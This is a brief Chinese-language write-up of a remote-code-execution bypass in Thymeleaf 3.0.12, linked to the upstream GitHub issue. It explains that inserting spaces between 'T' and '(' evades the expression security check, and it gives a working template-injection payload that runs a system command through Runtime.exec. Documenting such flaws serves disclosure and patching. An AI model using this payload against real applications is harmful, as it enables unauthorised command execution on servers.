# Thymeleaf 3.0.12 RCE Bypass

问题详情可以见：https://github.com/thymeleaf/thymeleaf/issues/828

通过更改表达式可以进行绕过安全检查，在T和(之间添加若干个空格字符即可绕过检查进行RCE。

Payload：

```
${T (java.lang.Runtime).getRuntime().exec("whoami")}

```

官方issue:https://github.com/thymeleaf/thymeleaf/issues/828